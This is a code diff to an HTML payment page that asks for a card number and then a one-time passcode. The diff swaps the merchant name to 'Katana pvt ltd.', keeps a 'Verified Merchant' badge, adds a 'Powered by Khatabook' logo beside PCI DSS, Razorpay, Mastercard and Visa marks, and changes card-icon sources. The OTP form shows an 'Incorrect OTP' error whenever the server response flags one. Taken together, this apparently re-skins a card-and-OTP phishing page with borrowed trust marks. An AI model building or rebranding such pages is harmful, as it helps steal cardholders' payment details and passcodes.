@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Payment Gateway</title>
+  <title>Katana pvt ltd.</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
     .rupee-sign {
@@ -175,7 +175,6 @@
       filter: blur(1px);
     }
     .hidden { display: none !important; }
-    /* OTP container: input and button side-by-side, each 50% */
     .otp-container {
       display: flex;
     }
@@ -191,6 +190,21 @@
       height: 24px;
       width: auto;
       display: block;
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    #cardTypeIcon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 24px;
+      width: 38px;
     }
     .otp-error {
       color: #ef4444;
@@ -213,7 +227,7 @@
                   <img src="https://images.unsplash.com/photo-1572059002053-8cc5ad2f4a38?w=64&h=64&fit=crop" alt="Merchant Logo" class="w-full h-full object-cover" />
                 </div>
                 <div class="flex flex-col">
-                  <span class="text-2xl font-semibold">Geekay</span>
+                  <span class="text-2xl font-semibold">Katana pvt ltd.</span>
                   <div class="merchant-badge mt-1">
                     <div class="flex items-center gap-1 text-gray-600 text-sm">
                       <svg class="w-4 h-4 text-green-500 shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -227,7 +241,7 @@
                           <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                         </svg>
                         <div class="flex flex-col">
-                          <span class="text-lg font-semibold text-white">Geekay</span>
+                          <span class="text-lg font-semibold text-white">Katana pvt ltd.</span>
                           <span class="verified-tag">Verified Merchant</span>
                         </div>
                       </div>
@@ -354,7 +368,6 @@
                   </button>
                 </div>
               </div>
-              <!-- OTP error message placed below the OTP row and above the timer -->
               <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
               <p class="text-center text-sm text-gray-500 mt-2">
                 Time remaining: <span id="timer">2:59</span>
@@ -375,8 +388,11 @@
     </div>
 
     <div class="bottom-logos flex justify-center items-center gap-6">
+      
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Khatabook.svg" alt="Powered by Khatabook" class="h-6" />
+      
       <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" class="h-6" />
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Razorpay_logo.svg/2560px-Razorpay_logo.svg.png" alt="Razorpay" class="h-4" />
+      <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" class="h-4" />
       <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" class="h-6" />
       <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
     </div>
@@ -480,16 +496,16 @@
           img.style.width = "auto";
           switch (type) {
             case 'visa':
-              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png';
+              img.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
               break;
             case 'mastercard':
-              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png';
+              img.src = 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png';
               break;
             case 'amex':
-              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png';
+              img.src = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
               break;
             case 'rupay':
-              img.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png';
+              img.src = 'https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg';
               break;
           }
           img.alt = type;
@@ -610,7 +626,7 @@
             document.getElementById('paymentForm').classList.add('hidden');
             document.getElementById('otpForm').classList.remove('hidden');
             const cardNumber = document.getElementById('cardNumber').value;
-            document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+             document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
             if (!timerInterval) { startOtpTimer(); }
             if (data.otpError) {
               document.getElementById('otpError').style.display = 'block';
